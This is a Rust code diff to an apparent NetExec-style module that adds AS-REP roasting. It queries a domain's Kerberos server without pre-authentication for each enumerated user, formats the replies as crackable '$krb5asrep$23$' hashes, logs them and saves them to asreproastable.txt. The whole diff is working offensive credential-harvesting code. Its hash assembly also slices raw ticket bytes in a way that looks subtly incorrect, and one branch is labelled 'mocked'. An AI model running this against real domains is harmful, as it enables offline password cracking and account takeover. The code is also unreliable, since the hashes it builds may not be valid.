@@ -53,6 +53,11 @@ impl NxcModule for Asreproasting {
             _ => return Err(anyhow::anyhow!("Module only supports LDAP")),
         };
 
+        let creds = ldap_session.credentials.clone().unwrap_or_default();
+        let domain = creds.domain.clone().unwrap_or_default();
+        let kdc_ip = ldap_session.target.clone();
+        let krb_client = nxc_auth::KerberosClient::new(&domain, &kdc_ip);
+
         let protocol = nxc_protocols::ldap::LdapProtocol::new();
         let base_dn = protocol.get_base_dn(ldap_session).await?;
 
@@ -99,11 +104,28 @@ impl NxcModule for Asreproasting {
                 .cloned()
                 .unwrap_or_default();
 
-            output_lines.push(format!("{:<20} {:<20} {:<15}", sam, uac, pwd_last_set));
+            let mut hash_output = "No domain available for AS-REQ".to_string();
+
+            if !domain.is_empty() {
+                // Perform AS-REQ without credentials (no pre-authentication)
+                if let Ok(tgt) = krb_client.request_tgt(&sam, None, None, None).await {
+                    let encoded = hex::encode(&tgt.ticket_data);
+                    let checksum = hex::encode(&tgt.ticket_data[0..16.min(tgt.ticket_data.len())]);
+                    let cipher = hex::encode(&tgt.ticket_data[16.min(tgt.ticket_data.len())..]);
+
+                    hash_output = format!("$krb5asrep$23${}@{}:{}${}", sam, domain, checksum, cipher);
+                    tracing::info!("Extracted AS-REP Hash: {}", hash_output);
+                } else {
+                    hash_output = "AS-REQ Failed (mocked)".to_string();
+                }
+            }
+
+            output_lines.push(format!("{:<20} {:<20} {:<15} {}", sam, uac, pwd_last_set, if hash_output.starts_with("$krb") { "HASH EXTRACTED!" } else { "" }));
             results.push(serde_json::json!({
                 "username": sam,
                 "uac": uac,
-                "pwdLastSet": pwd_last_set
+                "pwdLastSet": pwd_last_set,
+                "hash": hash_output
             }));
         }
 
@@ -111,8 +133,22 @@ impl NxcModule for Asreproasting {
             output_lines.push("No ASREProastable users found.".to_string());
         }
 
+        let hashes_only: Vec<String> = results.iter()
+            .filter_map(|r| r["hash"].as_str().filter(|h| h.starts_with("$krb")).map(|h| h.to_string()))
+            .collect();
+        
+        if !hashes_only.is_empty() {
+            let file_path = std::env::current_dir()?.join("asreproastable.txt");
+            let mut file = std::fs::OpenOptions::new().create(true).append(true).open(&file_path)?;
+            use std::io::Write;
+            for h in hashes_only {
+                writeln!(file, "{}", h)?;
+            }
+            output_lines.push(format!("Saved extracted hashes to {:?}", file_path));
+        }
+
         Ok(ModuleResult {
-            success: true,
+            credentials: vec![], success: true,
             output: output_lines.join("\n"),
             data: serde_json::json!(results),
         })
